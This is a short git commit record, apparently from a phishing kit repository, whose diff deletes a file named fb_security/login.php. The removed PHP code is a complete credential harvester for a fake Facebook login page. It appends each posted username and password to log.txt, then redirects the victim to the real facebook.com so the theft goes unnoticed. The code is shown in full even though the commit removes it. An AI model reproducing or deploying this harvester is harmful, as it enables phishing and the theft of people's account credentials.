2ba35bc441bd9ac015ef814b915708bdab69953d
PH4N70M (X PHANTOM) <70594016+XPH4N70M@users.noreply.github.com>
2022-05-18 15:28:30 +0530

    Delete .sites directory

--- .sites/fb_security/login.php
+++
@@ -1,7 +0,0 @@
-<?php
-$file = 'log.txt';
-$fp = fopen($file , 'a');
-file_put_contents("log.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/');
-exit();
-?>
